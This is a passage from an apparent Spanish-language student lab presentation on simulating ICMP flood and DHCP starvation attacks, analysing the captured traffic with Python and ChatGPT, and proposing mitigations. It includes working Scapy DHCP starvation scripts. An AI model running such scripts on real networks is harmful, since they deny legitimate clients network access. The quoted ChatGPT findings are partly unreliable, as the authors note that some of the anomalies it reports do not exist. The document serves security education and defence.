<span id="cb2-74"><a href=""></a>        <span class="bu">print</span>(<span class="st">"Error al enviar paquetes con Scapy:"</span>)</span>
<span id="cb2-75"><a href=""></a>        <span class="bu">print</span>(<span class="bu">str</span>(e))</span>
<span id="cb2-76"><a href=""></a>        <span class="bu">print</span>(<span class="st">"</span><span class="ch">\n</span><span class="st">Posibles causas:"</span>)</span>
<span id="cb2-77"><a href=""></a>        <span class="bu">print</span>(<span class="st">"- No est√°s ejecutando como administrador."</span>)</span>
<span id="cb2-78"><a href=""></a>        <span class="bu">print</span>(<span class="st">"- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible')."</span>)</span>
<span id="cb2-79"><a href=""></a>        <span class="bu">print</span>(<span class="st">"- El adaptador f√≠sico est√° desconectado o en otra VLAN."</span>)</span>
<span id="cb2-80"><a href=""></a>        <span class="bu">print</span>(<span class="st">"- El nombre de interfaz detectado no es correcto para tu sistema."</span>)</span>
<span id="cb2-81"><a href=""></a>        <span class="bu">print</span>(<span class="st">"</span><span class="ch">\n</span><span class="st">Soluci√≥n r√°pida: ejecuta el script desde PowerShell/CMD como administrador o"</span>)</span>
<span id="cb2-82"><a href=""></a>        <span class="bu">print</span>(<span class="st">"pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py </span><span class="ch">\"</span><span class="st">Ethernet</span><span class="ch">\"</span><span class="st">"</span>)</span>
<span id="cb2-83"><a href=""></a></span>
<span id="cb2-84"><a href=""></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
<span id="cb2-85"><a href=""></a>    main()</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
<p class="code-caption">
</p><p>C√≥digo utilizado para DHCP Starvation<sup>1</sup></p>
<p></p>
<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode numberSource python number-lines code-with-copy"><code class="sourceCode python"><span id="cb3-1"><a href=""></a><span class="co">#!/usr/bin/env python3</span></span>
<span id="cb3-2"><a href=""></a><span class="co">#DHCP Starvation:</span></span>
<span id="cb3-3"><a href=""></a><span class="co">#Import Scapy</span></span>
<span id="cb3-4"><a href=""></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> <span class="op">*</span></span>
<span id="cb3-5"><a href=""></a></span>
<span id="cb3-6"><a href=""></a><span class="co">#conf.checkIPaddr needs to be set to False. </span></span>
<span id="cb3-7"><a href=""></a><span class="co">#When conf.checkIpaddr the reponse IP isn't checked</span></span>
<span id="cb3-8"><a href=""></a><span class="co">#against sending IP address. Don't need to match.   </span></span>
<span id="cb3-9"><a href=""></a>conf.checkIPaddr <span class="op">=</span> <span class="va">False</span></span>
<span id="cb3-10"><a href=""></a></span>
<span id="cb3-11"><a href=""></a><span class="co">#Create DHCP discover with destination IP = broadadcast</span></span>
<span id="cb3-12"><a href=""></a><span class="co">#Source MAC address is a random MAC address</span></span>
<span id="cb3-13"><a href=""></a><span class="co">#Source IP address = 0.0.0.0</span></span>
<span id="cb3-14"><a href=""></a><span class="co">#Destination IP address = broadcast</span></span>
<span id="cb3-15"><a href=""></a><span class="co">#Source port = 68 (DHCP / BOOTP Client)</span></span>
<span id="cb3-16"><a href=""></a><span class="co">#Destination port = 67 (DHCP / BOOTP Server)</span></span>
<span id="cb3-17"><a href=""></a><span class="co">#DHCP message type is discover</span></span>
<span id="cb3-18"><a href=""></a>dhcp_discover <span class="op">=</span> Ether(dst<span class="op">=</span><span class="st">'ff:ff:ff:ff:ff:ff'</span>,src<span class="op">=</span>RandMAC())  <span class="op">\</span></span>
<span id="cb3-19"><a href=""></a>                     <span class="op">/</span>IP(src<span class="op">=</span><span class="st">'0.0.0.0'</span>,dst<span class="op">=</span><span class="st">'255.255.255.255'</span>) <span class="op">\</span></span>
<span id="cb3-20"><a href=""></a>                     <span class="op">/</span>UDP(sport<span class="op">=</span><span class="dv">68</span>,dport<span class="op">=</span><span class="dv">67</span>) <span class="op">\</span></span>
<span id="cb3-21"><a href=""></a>                     <span class="op">/</span>BOOTP(op<span class="op">=</span><span class="dv">1</span>,chaddr <span class="op">=</span> RandMAC()) <span class="op">\</span></span>
<span id="cb3-22"><a href=""></a>                     <span class="op">/</span>DHCP(options<span class="op">=</span>[(<span class="st">'message-type'</span>,<span class="st">'discover'</span>),(<span class="st">'end'</span>)])</span>
<span id="cb3-23"><a href=""></a></span>
<span id="cb3-24"><a href=""></a><span class="co">#Send packet out of eth0 and loop the packet</span></span>
<span id="cb3-25"><a href=""></a>sendp(dhcp_discover,iface<span class="op">=</span><span class="st">'eth0'</span>,loop<span class="op">=</span><span class="dv">1</span>,verbose<span class="op">=</span><span class="dv">1</span>)</span>
<span id="cb3-26"><a href=""></a></span>
<span id="cb3-27"><a href=""></a><span class="co">#Credits:</span></span>
<span id="cb3-28"><a href=""></a><span class="co">#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/</span></span>
<span id="cb3-29"><a href=""></a><span class="co">#https://www.programcreek.com/</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
<p class="code-caption">
</p><p>Segunda opci√≥n de C√≥digo utilizado para DHCP Starvation<sup>2</sup></p>
<p></p>
<p>En WireShark, esto es representado en m√∫ltiples solicitudes DHCP. Para verificar que fue exitoso el ataque, en la consola se buscaron los estad√≠sticos del servidor DHCP, donde se verific√≥ que 245 fueron asignados (recordemos que las primeras 10 direcciones fueron omitidas).</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/dhcp_starv0.png"></p>
<figcaption>Evidence of Attack</figcaption>
</figure>
</div>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/dhcp_starv1.png"></p>
<figcaption>Evidence of Attack</figcaption>
</figure>
</div>
<aside><ol class="aside-footnotes"><li id="fn2"><p>C√≥digo utilizado para DHCP Starvation</p></li><li id="fn3"><p>Segunda opci√≥n de c√≥digo utilizado para DHCP Starvation</p></li></ol></aside></section>
<section id="conclusiones" class="slide level2">
<h2>Conclusiones</h2>
<p>La pr√°ctica confirm√≥ que, en un entorno controlado, tanto el DHCP Starvation como el Ping Flood son capaces de degradar y/o interrumpir el servicio de red: el primero acapar√≥ las direcciones disponibles del servidor DHCP (245 leases asignados en la prueba) y el segundo cre√≥ congesti√≥n perceptible en la conectividad ICMP hacia el router. Las evidencias captadas con Wireshark reafirman la efectividad de los ataques implementados en Python usando Scapy y la importancia de la monitorizaci√≥n para detectar este tipo de anomal√≠as. Como lecciones pr√°cticas, estos ataques muestran la necesidad de controles de seguridad a nivel de capa 2/3 en redes LAN: habilitar DHCP Snooping, port security (limitaci√≥n de MACs por puerto), rate limiting de ICMP, reglas de ACL y sistemas de detecci√≥n de intrusos para mitigar y alertar sobre patrones an√≥malos.</p>
</section>
<section class="slide level2">

</section></section>
<section>
<section id="fase-3-an√°lisis-de-datos-con-python" class="title-slide slide level1 center">
<h1>Fase 3: An√°lisis de datos con Python</h1>
<p>Ahora, el objetivo es poder identificar los ataques realizados desde el puesto de un analista de tr√°fico, el cual desconoce su realizaci√≥n. Para esto, se convirti√≥ el archivo <em>pcapng</em> de la ventana de tiempo de la simulaci√≥n a un csv y se abri√≥ con Python para poder analizar y hacer visualizaciones del comportamiento de paquetes junto con sus anomal√≠as detectadas.</p>
</section>
<section id="resultados" class="slide level2">
<h2>Resultados</h2>
<p>Primeramente, se grafica el flujo de paquetes a trav√©s del tiempo. Se observa un incremento significante en referencia al tr√°fico no priorizado sobretodo en los primeros diez minutos y entre los minutos 37 y 42. Se indaga m√°s al filtrar los tipos de paquetes en el tiempo total de corrida.</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/lineChartAllPackets.png"></p>
<figcaption>Time Series of Package traffic (All packets)</figcaption>
</figure>
</div>
<p>Se descubre que hubo una proporci√≥n excesiva de paquetes ICMP y DHCP, la cual excede en millones al resto de protocolos. Esta evidencia levanta sospechas al ser comportamiento an√≥malo.</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/top_by_protocol.png"></p>
<figcaption>Top IPs by Protocol</figcaption>
</figure>
</div>
<p>Al sobreponer este filtro de paquetes sobre la linea de tiempo anterior, se comprueba que esos protocolos son el origen de los picos de tr√°fico. Ahora la pregunta en cuesti√≥n es qui√©nes son los culpables.</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/lineChart.png"></p>
<figcaption>Time Series of ICMP and DHCP Package traffic</figcaption>
</figure>
</div>
<p>En conjunto, analizamos las direcciones IP origen y destino ordenadas por frecuencia en la base de datos. El hallazgo es evidente: la direcci√≥n conflictiva corresponde a la 192.168.10.13 con direcci√≥n a la 192.168.10.1 (la cual corresponde al ruteador). Esto da indicadores de ataques con intenci√≥n de deshabilitar al ruteador.</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/top_by_destination.png"></p>
<figcaption>Top IPs by Destination</figcaption>
</figure>
</div>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/top_by_source.png"></p>
<figcaption>Top IPs by Source</figcaption>
</figure>
</div>
<p>Regresando a la serie de tiempo y teniendo en cuenta a los involucrados, se identifica una intenci√≥n de ataque, por lo que se desgloza el comportamiento.</p>
<p>La l√≠nea de tiempo muestra dos fases distintas de ataque: primero un ICMP Flood, con un alto volumen de paquetes en los primeros minutos, seguido por un DHCP Starvation, donde el tr√°fico DHCP aumenta significativamente hacia el final.</p>
<h3 id="explicaci√≥n-de-evidencia-y-comportamiento-de-los-ataques"><strong>Explicaci√≥n de Evidencia y Comportamiento de los Ataques</strong></h3>
<p><strong>ICMP Flood</strong> El ataque ICMP Flood es m√°s r√°pido y visible, ya que satura el ancho de banda o la capacidad de respuesta del servidor mediante miles de solicitudes ping. Es eficiente a corto plazo, pero f√°cil de detectar y mitigar (por firewalls o limitaci√≥n de ICMP).</p>
<p><strong>DHCP Starvation</strong> El DHCP Starvation, en cambio, no genera tanto tr√°fico, pero bloquea la asignaci√≥n de IPs v√°lidas a los clientes leg√≠timos. Es m√°s silencioso y persistente, por lo que puede ser m√°s eficiente estrat√©gicamente, especialmente en redes locales (LAN).</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/lineChart.png"></p>
<figcaption>Time Series of ICMP and DHCP Package traffic</figcaption>
</figure>
</div>
<h3 id="conclusi√≥n-de-fase">Conclusi√≥n de Fase</h3>
<p>Aunque ambos ataques logran afectar la disponibilidad de la red, el DHCP Starvation es m√°s eficiente a nivel estrat√©gico, ya que usa menos recursos para saturar el serivcio del router. En cambio, el ICMP Flood provoca un impacto inmediato con un pico m√°s alto, pero es m√°s f√°cil de detectar y bloquear.</p>
<h4 id="diagn√≥stico">Diagn√≥stico</h4>
<p>Debido al an√°lisis frecuentista podemos aseverar que los dos ataques identificados fueron de DHCP starvation y ping flood, dado que sus respectivos protocolos tuvieron las mayores interacciones. A su vez, podemos identificar puntualmente al atacante y a la v√≠ctima por la frecuencia de destinatario y origen.</p>
</section>
<section class="slide level2">

</section></section>
<section>
<section id="fase-4-diagn√≥stico-con-inteligencia-artificial-y-mitigaci√≥n" class="title-slide slide level1 center">
<h1>Fase 4: Diagn√≥stico con Inteligencia Artificial y mitigaci√≥n</h1>
<p>El objetivo de esta actividad es consultar a alguna inteligencia artificial, en este caso Chat-GPT Pro 5.1, con los datos recolectados de la simulaci√≥n del ataque y captura de tr√°fico en un archivo <em>.pcapng</em>, elaborar un diagn√≥stico final y proponer soluciones o mitigaciones t√©cnicas frente a las anomal√≠as identificadas. Por cuestiones de limpieza, se incluir√°n s√≥lo las partes cruciales de la conversaci√≥n.</p>
</section>
<section id="transcripci√≥n-de-la-conversaci√≥n-con-chat-gpt" class="slide level2">
<h2>Transcripci√≥n de la conversaci√≥n con Chat-GPT</h2>
<p><code>Prompt:</code> <em>Hola, chat. Eres un analista de tr√°fico de datos (ciberseguridad) y te lleg√≥ este archivo .pcapng. Tu objetivo es analizar y mencionar las anomal√≠as que puedas encontrar. Pesa m√°s de 700 megas el archivo, as√≠ que estar√° en ZIP.</em></p>
<div class="callout callout-note callout-titled callout-style-default">
<div class="callout-body">
<div class="callout-title">
<div class="callout-icon-container">
<i class="callout-icon"></i>
</div>
<p><strong>Note</strong></p>
</div>
<div class="callout-content">
<p><code>Chat-GPT:</code> Perfecto, ya lo estuve ‚Äúdestripando‚Äù üòä. Te resumo lo que encontr√© como si fuera un informe de analista de tr√°fico:</p>
<ol type="1">
<li class="fragment"><strong>Panorama general del tr√°fico En el .pcapng hay:</strong></li>
</ol>
<ul>
<li class="fragment">~824,397 paquetes en total</li>
<li class="fragment">~822k IPv4, ~1.2k IPv6</li>
<li class="fragment">~1k no-IP</li>
</ul>
<p>Proporci√≥n por protocolo de capa 3:</p>
<ul>
<li class="fragment">ICMP: ~62.5% (515k paquetes) ‚Üí much√≠simo</li>
<li class="fragment">UDP: ~37.2% (306k paquetes)</li>
<li class="fragment">TCP: casi inexistente: 270 paquetes (~0.03%)</li>
</ul>
<p>Top hosts internos: 192.168.10.13 ‚Äì host m√°s activo (principal origen) 192.168.10.1 ‚Äì muy probablemente el gateway/router 192.168.10.12 ‚Äì segundo host interno importante 192.168.10.11 ‚Äì aparece casi s√≥lo en TFTP Tambi√©n aparecen direcciones raras como 192.168.10.0 y destino 255.255.255.0 usadas como si fueran hosts. Destinos externos relevantes: 8.8.8.8 (Google DNS) 1.1.1.1 (Cloudflare DNS) 23.64.121.49 (IP de un servidor HTTP, muy probablemente Akamai / CDN)</p>
<ol start="2" type="1">
<li class="fragment"><strong>Anomal√≠a #1 ‚Äì Tr√°fico ICMP</strong> brutal entre pocos hosts Hay m√°s de 515,000 paquetes ICMP distribuidos en solo 4 flujos: 192.168.10.13 ‚ÜîÔ∏é 192.168.10.1 192.168.10.13 ‚ÜîÔ∏é 192.168.10.12 Tipos ICMP observados:</li>
</ol>
<ul>
<li class="fragment"><strong>Type 8, code 0</strong> ‚Äì Echo Request (pings)</li>
<li class="fragment"><strong>Type 0, code 0</strong>‚Äì Echo Reply</li>
<li class="fragment"><strong>Type 3, code 1</strong> ‚Äì Destination Unreachable (host unreachable)</li>
<li class="fragment"><strong>Type 3, code 2</strong> ‚Äì Destination Unreachable (protocol unreachable)</li>
</ul>
<p><mark>Lo raro: Para un entorno normal, no es nada com√∫n tener &gt;500k ICMP en una captura as√≠. Hay flujos ICMP muy sim√©tricos, con &gt;120k paquetes por flujo (parece ping flood o prueba de estr√©s). Presencia continua de Destination Unreachable indica que se est√° intentando llegar a algo que no responde o a un servicio cerrado. <strong> üëâ Interpretaci√≥n: </strong> Esto huele a ataque o prueba de ICMP flood / host discovery masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12. No parece tr√°fico ‚Äúnormal de usuario‚Äù (tipo un par de pings).</mark></p>
<ol start="3" type="1">
<li class="fragment"><strong>Anomal√≠a #2 ‚Äì Tormenta de DHCP (UDP 67)</strong> con direcciones ‚Äúraras‚Äù Puertos destino m√°s usados (UDP/TCP):</li>
</ol>
<ul>
<li class="fragment">67/UDP (DHCP server): ~304,315 paquetes</li>
<li class="fragment">53/UDP (DNS): 1,280</li>
<li class="fragment">16990/UDP: 875</li>
<li class="fragment">80/TCP: 150</li>
<li class="fragment">69/UDP (TFTP): 22</li>
<li class="fragment">137/UDP, 138/UDP</li>
<li class="fragment">5355/UDP: unos cuantos (NetBIOS/LLMNR)</li>
</ul>
<p>Al revisar UDP hacia/desde puerto 67: Tr√°fico repetido del tipo: 192.168.10.0:68 ‚Üí 192.168.10.255:67 Lo raro: Un cliente DHCP t√≠pico usa: 0.0.0.0:68 ‚Üí 255.255.255.255:67 Aqu√≠ se usa 192.168.10.0 como origen (que normalmente es la direcci√≥n de red, no un host) y 192.168.10.255 como broadcast. El volumen es enorme: m√°s de 300k paquetes DHCP.</p>
<p><mark> <strong>üëâ Interpretaci√≥n:</strong> Esto es altamente sospechoso de DHCP starvation / DHCP flood o de una herramienta que genera tr√°fico DHCP malformado o spoofeado. El uso de 192.168.10.0 como host refuerza la idea de spoofing o de un escenario de laboratorio para ataques.</mark></p>
<p><em>[‚Ä¶]</em></p>
<ol start="9" type="1">
<li class="fragment"><strong>Resumen ejecutivo</strong> <em>[‚Ä¶]</em> En este .pcapng se observan m√∫ltiples comportamientos an√≥malos altamente sugerentes de un escenario de laboratorio con ataques: ICMP flood / scanning masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12 (m√°s de 500k paquetes ICMP). Tormenta DHCP con direcciones de origen/destino no est√°ndar (192.168.10.0 ‚Üí 192.168.10.255, &gt;300k paquetes), compatible con DHCP starvation o flood <em>[‚Ä¶]</em>.</li>
</ol>
</div>
</div>
</div>
</section>
<section id="diagn√≥stico-final" class="slide level2">
<h2>Diagn√≥stico final</h2>
<p>Con base en nuestra revisi√≥n del tr√°fico capturado y en la interpretaci√≥n de Chat-GPT, se identificaron los siguientes elementos: 1. ICMP Flood/Ping Flood: Chat-GPT fue capaz de reconocer m√°s de 515,000 paquetes ICMP entre pocos hosts. Su interpretaci√≥n hace hincapi√© en la existencia de un tr√°fico anormalmente elevado, y cito, ‚Äúorientado a saturar la red o realizar reconocimiento agresivo‚Äù.</p>
<ol start="2" type="1">
<li class="fragment"><p>DHCP Starvation: En este caso, Chat-GPT encontr√≥ m√°s de 300,000 solicitudes DHCP con direcciones inv√°lidas (192.168.10.0, por ejemplo). La interpretaci√≥n se centra en el intento de consumir todas las direcciones del servidor DHCP para impedir que clientes leg√≠timos reciban red.</p></li>
<li class="fragment"><p>Uso excesivo de un puerto UDP at√≠pico (67).</p></li>
</ol>
<p>Tambi√©n, Chat-GPT hizo varios descubrimientos que nosotros no notamos (o no buscamos) cuando hicimos nuestro an√°lisis pero, por otra parte, sospecha de algunas anomal√≠as inexistentes. Adjuntamos la transcripci√≥n de Chat-GPT sobre sus descubrimientos adicionales.</p>
<div class="callout callout-note callout-titled callout-style-default">
<div class="callout-body">
<div class="callout-title">
<div class="callout-icon-container">
<i class="callout-icon"></i>
</div>
<p><strong>Note</strong></p>
</div>
<div class="callout-content">
<ol start="3" type="1">
<li class="fragment"><strong>SYN Scan / SYN Flood:</strong> Evidencia: 270 paquetes TCP con flag SYN, sin SYN-ACK ni ACK. Interpretaci√≥n: escaneo semiabierto o ataque de negaci√≥n de servicio.</li>
<li class="fragment"><strong>Spoofing de direcciones IP:</strong> Evidencia: direcciones imposibles usando cabeceras IP v√°lidas. Interpretaci√≥n: ocultamiento deliberado del origen del tr√°fico.</li>
<li class="fragment"><strong>TFTP Broadcast An√≥malo:</strong> Evidencia: host 192.168.10.11 enviando requests TFTP a broadcast. Interpretaci√≥n: b√∫squeda de servidores TFTP o inicios de transferencia no autorizada.</li>
<li class="fragment"><strong>Canal UDP sospechoso (16990):</strong> Evidencia: flujo intenso entre 192.168.10.12 y 192.168.10.13. Interpretaci√≥n: posible t√∫nel, canal C2, o aplicaci√≥n no autorizada.</li>
</ol>
<p><strong>S√≠ntomas observados:</strong></p>
<ul>
<li class="fragment">Saturaci√≥n de tr√°fico ICMP</li>
<li class="fragment">P√©rdida de disponibilidad en DHCP</li>
<li class="fragment">Intentos de conexi√≥n TCP incompletos</li>
<li class="fragment">Tr√°fico interno no autorizado <em>[‚Ä¶]</em></li>
<li class="fragment">Congesti√≥n generalizada por tr√°fico repetitivo</li>
<li class="fragment">Impacto potencial
<ul>
<li class="fragment">Disponibilidad: Ca√≠da del servidor DHCP ‚Üí usuarios sin conectividad</li>
<li class="fragment">Saturaci√≥n de red por ICMP ‚Üí latencia elevada <em>[‚Ä¶]</em></li>
<li class="fragment">Exploraci√≥n de puertos (SYN scan) Operaciones: Interrupci√≥n del trabajo de usuarios</li>
<li class="fragment">Inestabilidad en servicios cr√≠ticos</li>
<li class="fragment">Potencial escalaci√≥n a explotaci√≥n de vulnerabilidades</li>
</ul></li>
</ul>
</div>
</div>
</div>
</section>
<section id="propuesta-de-mitigaci√≥n" class="slide level2">
<h2>Propuesta de mitigaci√≥n</h2>
<h3 id="propuesta-del-equipo">Propuesta del equipo</h3>
<p>Despu√©s de analizar el tr√°fico capturado, se recalca que la mayor parte del problema viene de una cantidad excesiva de paquetes ICMP, especialmente de pings (Echo Request). Esto puede saturar la red, causar lentitud y afectar a otros dispositivos. Por ello se propone las siguientes acciones para mitigar este tipo de ataque:</p>
<ol type="1">
<li class="fragment">Limitar la cantidad de pings permitidos por segundo. Configurar en el router o firewall un l√≠mite de cu√°ntas solicitudes ICMP puede recibir el equipo por segundo. Con esto, aunque un atacante mande miles de pings, el router simplemente los va a ignorar.</li>
<li class="fragment">Bloquear pings provenientes de direcciones sospechosas. En la captura vimos direcciones que no deber√≠an existir (como 192.168.10.0). Se pueden bloquear manualmente para evitar que env√≠en m√°s paquetes ICMP.</li>
<li class="fragment">Reducir el uso de ICMP dentro de la red. Si no es estrictamente necesario, se puede restringir el ping entre todos los equipos para reducir la superficie de ataque. Por ejemplo: permitir pings solo al gateway para diagn√≥stico y bloquear el resto.</li>
<li class="fragment">Monitorear el equipo que m√°s paquetes ICMP envi√≥. El host 192.168.10.13 fue el m√°s activo. Se recomienda revisarlo, porque puede estar infectado o mal configurado.</li>
<li class="fragment">Crear alertas si el volumen de ICMP sube m√°s de lo normal. Configurar herramientas de monitoreo b√°sico para que avise si se detecta de nuevo una cantidad alta de ICMP.</li>
</ol>
<p>En resumen: Limitar ICMP, bloquear direcciones raras, monitorear el equipo m√°s activo y activar alertas para evitar que un ping flood o DHCP Starvation vuelva a saturar la red.</p>
<h3 id="chat-gpt">Chat-GPT:</h3>
<div class="callout callout-note callout-titled callout-style-default">
<div class="callout-body">
<div class="callout-title">
<div class="callout-icon-container">
<i class="callout-icon"></i>
</div>
<p><strong>Note</strong></p>
</div>
<div class="callout-content">
<ol type="1">
<li class="fragment"><p><strong>Mitigaci√≥n contra ICMP Flood (Ping Flood)</strong></p>
<ol type="1">
<li class="fragment">Implementar rate limiting en dispositivos perimetrales. Configurar l√≠mites para las solicitudes ICMP de tipo echo-request. Esto reduce la saturaci√≥n del plano de control. Ejemplo de regla para limitar a 10 paquetes por segundo:</li>
</ol>
<p>iptables -A INPUT -p icmp ‚Äìicmp-type echo-request -m limit ‚Äìlimit 10/second -j ACCEPT iptables -A INPUT -p icmp ‚Äìicmp-type echo-request -j DROP</p>
<ol start="2" type="1">
<li class="fragment">Filtrado de direcciones malformadas Bloquear paquetes ICMP provenientes de direcciones que no deber√≠an usarse como origen, como 192.168.10.0 o 255.255.255.0. 1.3. Control Plane Policing (CoPP) Configurar pol√≠ticas en el router para limitar la cantidad de ICMP que llega al CPU.</li>
</ol></li>
<li class="fragment"><p><strong>Mitigaci√≥n contra DHCP Starvation / DHCP Flood</strong></p>
<ol type="1">
<li class="fragment">Habilitar DHCP Snooping Evita que puertos no autorizados generen solicitudes DHCP masivas. Configuraci√≥n recomendada: ip dhcp snooping ip dhcp snooping vlan 10 interface GigabitEthernet0/1 ip dhcp snooping limit rate 10</li>
<li class="fragment">Implementar Port Security Limitar la cantidad de direcciones MAC permitidas por puerto para impedir creaci√≥n de cientos de clientes falsos. switchport port-security switchport port-security maximum 2 switchport port-security violation restrict</li>
</ol></li>
<li class="fragment"><p><strong>Mitigaci√≥n contra SYN Scan y SYN Flood</strong></p>
<ol type="1">
<li class="fragment">Activar SYN Cookies Esta funci√≥n impide que los recursos del servidor se agoten durante ataques de inundaci√≥n. sysctl -w net.ipv4.tcp_syncookies=1</li>
<li class="fragment">Configurar rate limiting para paquetes SYN. Limita la cantidad de solicitudes de conexi√≥n TCP sin completar handshake. iptables -A INPUT -p tcp ‚Äìsyn -m limit ‚Äìlimit 5/sec -j ACCEPT iptables -A INPUT -p tcp ‚Äìsyn -j DROP</li>
</ol></li>
<li class="fragment"><p><strong>Mitigaci√≥n contra Spoofing de IP</strong></p>
<ol type="1">
<li class="fragment">Activar Reverse Path Filtering Permite detectar y descartar paquetes con direcciones de origen falsificadas. sysctl -w net.ipv4.conf.all.rp_filter=1</li>
<li class="fragment">Aplicar Unicast Reverse Path Forwarding (uRPF). Se recomienda habilitar uRPF en modo estricto para evitar spoofing en redes internas. ip verify unicast source reachable-via rx</li>
</ol></li>
<li class="fragment"><p><strong>Mitigaci√≥n contra TFTP broadcast no autorizado 5.1.</strong> Bloquear el puerto UDP/69 salvo excepciones expl√≠citas. Restringirlo en toda la red interna para evitar transferencia abierta de archivos. iptables -A INPUT -p udp ‚Äìdport 69 -j DROP</p>
<ol type="1">
<li class="fragment">Uso de ACLs Aplicar listas de control para bloquear solicitudes hacia broadcast donde no son necesarias. deny udp any any eq 69</li>
</ol></li>
<li class="fragment"><p><strong>Mitigaci√≥n contra canales UDP no est√°ndar</strong></p>
<ol type="1">
<li class="fragment">Bloquear el tr√°fico hacia el puerto 16990 Cerrar el puerto 16990 en el firewall perimetral y local si no existe una justificaci√≥n documentada. <em>[‚Ä¶]</em></li>
</ol></li>
<li class="fragment"><p><strong>Mitigaci√≥n continua (Monitoreo y endurecimiento)</strong></p>
<ol type="1">
<li class="fragment">Configurar un IDS/IPS. Se recomienda utilizar Snort o Suricata con reglas espec√≠ficas para detectar:</li>
</ol>
<ul>
<li class="fragment">Flood ICMP Solicitudes</li>
<li class="fragment">DHCP an√≥malas</li>
<li class="fragment">Escaneos SYN</li>
<li class="fragment">Spoofing</li>
<li class="fragment">Uso de puertos no est√°ndar</li>
</ul>
<ol start="2" type="1">
<li class="fragment">Establecimiento de alertas. Configurar alertas en herramientas de monitoreo como Zabbix, PRTG o Grafana. Los umbrales sugeridos incluyen: Aumento anormal en tr√°fico ICMP, Incremento en solicitudes DHCP, Elevaci√≥n en paquetes TCP SYN, Actividad inesperada en puertos UDP</li>
<li class="fragment">Endurecimiento de sistemas Actualizaci√≥n continua de sistemas y firmware Deshabilitar servicios no utilizados (como TFTP) Monitoreo de integridad con herramientas como Wazuh o Tripwire</li>
</ol></li>
</ol>
</div>
</div>
</div>
</section></section>
<section id="conclusi√≥n-del-proyecto" class="title-slide slide level1 center">
<h1>Conclusi√≥n del Proyecto</h1>
<p>El desarrollo integral del proyecto permiti√≥ demostrar de manera pr√°ctica c√≥mo distintos ataques de denegaci√≥n de servicio ‚Äîparticularmente ICMP Flood y DHCP Starvation‚Äî pueden comprometer la disponibilidad de una red incluso en escenarios locales aparentemente protegidos. La simulaci√≥n confirm√≥ que el ICMP Flood provoca un impacto inmediato y masivo en el tr√°fico, mientras que el DHCP Starvation opera de forma silenciosa hasta agotar los recursos del servidor DHCP. El an√°lisis de tr√°fico con Python y los resultados generados por ChatGPT mostraron patrones claros de anomal√≠as, identificando a los dispositivos involucrados y validando la naturaleza de los ataques. En la √∫ltima fase resalta la crucialidad de un experto en √°rea para discriminar comportamientos an√≥malos de los com√∫nes, contextualizar tr√°fico en una red y comprender la configuraci√≥n y medidas de prevenci√≥n personalizadas: √°reas en las cuales fallan las herramientas de inteligencia artificial. No obstante, estas pueden detectar en corto tiempo (aunque limitadas por el peso de los archivos) bastantes comportamientos generalmente denominados como at√≠picos. Este enfoque complementario entre simulaci√≥n, an√°lisis estad√≠stico y diagn√≥stico asistido por IA refuerza la importancia de la observabilidad y la correlaci√≥n de eventos en la ciberseguridad moderna. En conjunto, el proyecto evidencia la urgencia de implementar estrategias de defensa ya que cualquier red se encuentra comunmente vulnerable.</p>

</section>


    </div>
  <div class="quarto-auto-generated-content" style="display: none;">
<div class="footer footer-default">

</div>
</div></div>

  <script>window.backupDefine = window.define; window.define = undefined;</script>
  <script src="Presentation_Spanish_files/libs/revealjs/dist/reveal.js"></script>
  <!-- reveal.js plugins -->
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/quarto-line-highlight/line-highlight.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/pdf-export/pdfexport.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/reveal-menu/menu.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/reveal-menu/quarto-menu.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/quarto-support/support.js"></script>
  

  <script src="Presentation_Spanish_files/libs/revealjs/plugin/notes/notes.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/search/search.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/zoom/zoom.js"></script>
  <script src="Presentation_Spanish_files/libs/revealjs/plugin/math/math.js"></script>
  <script>window.define = window.backupDefine; window.backupDefine = undefined;</script>

  <script>

      // Full list of configuration options available at:
      // https://revealjs.com/config/
      Reveal.initialize({
'controlsAuto': true,
'previewLinksAuto': false,
'pdfSeparateFragments': false,
'autoAnimateEasing': "ease",
'autoAnimateDuration': 1,
'autoAnimateUnmatched': true,
'jumpToSlide': true,
